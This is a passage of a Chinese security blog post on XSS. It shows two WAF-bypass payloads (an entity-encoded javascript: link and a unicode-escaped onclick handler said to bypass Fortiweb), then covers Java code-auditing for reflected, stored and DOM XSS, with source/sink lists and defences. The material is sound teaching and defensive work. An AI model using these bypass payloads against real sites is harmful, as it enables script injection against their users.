+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;a href=javas&amp;#99;ript:alert(1)&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Fortiweb WAF Bypass by <a href="https://twitter.com/rezaduty"target="_blank" rel="external nofollow noopener noreferrer">@rezaduty<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a> - 9th July 2019</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\u003e\u003c\u0068\u0031 onclick=alert(&#39;1&#39;)\u003e
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="练习平台">练习平台</h3>
+<p>靶场：xss-labs</p>
+<h3 id="工具">工具</h3>
+<ul>
+<li>xss平台</li>
+<li>beef</li>
+</ul>
+<h2 id="java代码审计">Java代码审计</h2>
+<p>一种审计策略：</p>
+<p>1.收集输入、输出点</p>
+<p>2.查看输入、输出点的上下文环境</p>
+<p>3.判断Web应用是否对输入、输出环境做了防御工作</p>
+<h3 id="xss常见触发位置">XSS常见触发位置</h3>
+<p><strong>输入</strong>在Java中常用<code>request.getParameter(param)</code>或<code>${param}</code>获取用户的输入信息；</p>
+<p><strong>输出</strong>主要表现为前端的渲染，我们可以定位前端中的一些常见的标识符来找到他们，然后根据后端逻辑来判断漏洞是否存在。</p>
+<p><strong>1.JSP表达式</strong></p>
+<p><code>&lt;%=变量%&gt;</code>是<code>&lt;%out.println(变量);%&gt;</code>的简写方式，<code>&lt;%=%&gt;</code>用于将已声明的变量或表达式输出到外网页中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"></code></pre></td></tr></table>
+</div>
+</div><p><strong>2.EL（表达式语言）</strong></p>
+<p>是为了使jsp写起来更加简单。</p>
+<p>例如：<code>&lt;%=request.getParameter(&quot;username&quot;)%&gt;</code>等价于<code>${param.username}</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;c:out&gt; 标签
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">&lt;c:if&gt; 标签
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">&lt;c:forEach&gt; 标签
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>3.ModelAndView类的使用</strong></p>
+<p>ModelAndView用来存储处理完成后的结果数据，以及显示该数据的视图，其前端JSP页面可以使用<code>${参数}</code>的方法来获取值</p>
+<p><strong>4.ModelMap类的使用</strong></p>
+<p>可以根据模型属性的具体类型自动生成模型属性的名称</p>
+<p><strong>5.Model类的使用</strong></p>
+<h3 id="对于反射型xss">对于反射型XSS</h3>
+<p>白盒审计中，需要寻找带有参数的输出方法，然后对输出方法对输出内容回溯输入参数</p>
+<h3 id="对于存储型xss">对于存储型XSS</h3>
+<p>要统一寻找“输出点”和“输出点”。由于输出点与输入点可能不在一个业务流中，可以考虑以下方法提高效率：</p>
+<p>1.黑白盒结合</p>
+<p>2.通过功能、接口名、表名、字段名等角度做搜索</p>
+<p>寻找输入点</p>
+<p>审计输入点代码</p>
+<p>对输出点进行审计</p>
+<h3 id="对于dom型xss">对于Dom型XSS</h3>
+<p>dom型xss不需要与服务器交互，它只发生在客户端处理数据阶段。</p>
+<p>粗略说，Dom型xss的成因是不可控的危险数据，未经过滤传入存在缺陷的js代码处理。</p>
+<p><strong>Dom型XSS常见的输入输出点：</strong></p>
+<table>
+<thead>
+<tr>
+<th>输入点</th>
+<th>输出点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>document.URL</td>
+<td>eval</td>
+</tr>
+<tr>
+<td>document.location</td>
+<td>document.write</td>
+</tr>
+<tr>
+<td>document.referer</td>
+<td>document.InnerHTML</td>
+</tr>
+<tr>
+<td>document.form</td>
+<td>document.OuterHTML</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h3 id="关键字">关键字</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;%<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="si">${</span><span class="p">
+</span></span></span><span class="line"><span class="cl"><span class="p">&lt;c:</span><span class="nv">out</span><span class="p">
+</span></span></span><span class="line"><span class="cl"><span class="p">&lt;c:</span><span class="nv">if</span><span class="p">
+</span></span></span><span class="line"><span class="cl"><span class="p">&lt;c:</span><span class="nv">forEach</span><span class="p">
+</span></span></span><span class="line"><span class="cl"><span class="p">ModelAndView
+</span></span></span><span class="line"><span class="cl"><span class="p">ModelMap
+</span></span></span><span class="line"><span class="cl"><span class="p">Model
+</span></span></span><span class="line"><span class="cl"><span class="p">request.getParameter
+</span></span></span><span class="line"><span class="cl"><span class="p">request.setAttibute
+</span></span></span><span class="line"><span class="cl"><span class="p">request.getWriter().print()
+</span></span></span><span class="line"><span class="cl"><span class="p">request.getWriter().writer()
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="漏洞防御">漏洞防御</h2>
+<ul>
+<li>对与后端有交互的位置执行参数的输入过滤（课通过Java的filter、Spring参数校验注解来实现。比如编写全局过滤器实现拦截并在web.xml中进行配置）</li>
+<li>对与后端有交互的位置执行参数的输出转义/html编码等</li>
+<li>开启JS开发框架的XSS防护功能</li>
+<li>设置HttpOnly（严格的说，HttpOnly对防御XSS不起作用，主要是为了解决xss漏洞后续的cookie劫持攻击，可以阻止客户端脚本访问cookie）</li>
+<li>采用OWASP企业安全程序接口(ESAPI)实现，类似内容还有谷歌的xssProtect等</li>
+</ul>
+<h2 id="参考">参考</h2>
+<p><a href="https://www.cnblogs.com/xyz315/p/14850359.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/xyz315/p/14850359.html<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1474865"target="_blank" rel="external nofollow noopener noreferrer">https://cloud.tencent.com/developer/article/1474865<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-wrappers-javascript-and-data-uri"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-wrappers-javascript-and-data-uri<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>未完待续&hellip;</p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=2023-01-21&#32;16:47:23>更新于 2023-01-21&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"><span><a href="/xss%E6%BC%8F%E6%B4%9E/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span><span><a href="https://github.com/shuai06/edit/main/content/posts/XSS%e6%bc%8f%e6%b4%9e.md" title="编辑此页"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">编辑此页</a></span></div>
+      <div class="post-info-share">
+        <span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/xss/' class="post-tag">XSS</a><a href='/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/' class="post-tag">渗透测试</a><a href='/tags/web%E5%AE%89%E5%85%A8/' class="post-tag">Web安全</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="post-nav-item" rel="prev" title="文件上传漏洞"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>文件上传漏洞</a>
+      <a href="/cve-2021-43798grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="post-nav-item" rel="next" title="CVE-2021-43798（Grafana 未授权任意文件读取漏洞）">CVE-2021-43798（Grafana 未授权任意文件读取漏洞）<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="giscus">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="hugo-fixit/FixIt"
+            data-repo-id="R_kgDOGihPtQ"
+            data-category="General"
+            data-category-id="DIC_kwDOGihPtc4CApHX"
+            data-mapping="title"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div></article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.109.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">
+              <a href="http://geoer.cn"target="_blank" rel="external nofollow noopener noreferrer">剑胆琴心</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--bg-progress: #000;--bg-progress-dark: #fff;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark_dimmed","lightTheme":"light"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"pangu":{"enable":true,"selector":"article"},"search":{"algoliaAppID":"YKOM6PKLUY","algoliaIndex":"index.zh-cn","algoliaSearchKey":"a44c110d3ac360be2c69cd79d34b77a8","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"watermark":{"content":"\u003cimg class=\"fixit-icon\" src=\"/images/avatar.png\" alt=\"FixIt logo\" /\u003e 剑胆琴心","enable":true,"height":21,"opacity":0.0125}};</script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
+</html>
